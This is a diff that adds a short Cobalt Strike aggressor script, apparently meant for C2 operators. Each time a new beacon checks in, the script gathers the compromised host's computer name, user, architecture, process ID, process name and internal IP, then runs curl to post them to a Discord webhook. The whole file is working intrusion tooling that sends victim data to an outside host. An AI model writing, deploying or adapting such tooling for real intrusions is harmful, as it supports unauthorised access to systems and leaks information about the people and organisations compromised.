@@ -1,0 +1,17 @@
+# Author : Frey
+# Description : Discord WebHook Notifier for Cobalt Strike Agents
+# Written purely because there's no actual Notifier without being based on a side python script
+
+on beacon_initial {
+        $DiscordHook = '<WEBHOOK>';
+        $teamserver_hostname = "127.0.0.1 Team Server";
+        $computer = beacon_info($1, "computer");
+        $arch = beacon_info($1, "arch");
+        $pid = beacon_info($1, "pid");
+        $process = beacon_info($1, "process");
+        $internal = beacon_info($1, "internal");
+        $user = beacon_info($1, "user");
+        $beacon_text = '{"avatar_url": "https://blog.parrot-pentest.com/wp-content/uploads/2022/07/cobalt.png", "username": "Cobalt Strike Agent Notifier", "content":"New Beacon on **' . $teamserver_hostname . '**\\nComputer Name : **' . $computer . '**\\nCurrent User : **' . $user . '**\\nArchitecture : **' . $arch . '**\\nProcess ID : **' . $pid . '**\\nCurrent Process : **' . $process . '**\\nInternal IP : **' . $internal . '**"}';
+	@curl_command = @('curl', '-H', 'Content-Type: application/json', '-d', $beacon_text, $DiscordHook);
+	exec(@curl_command);
+}
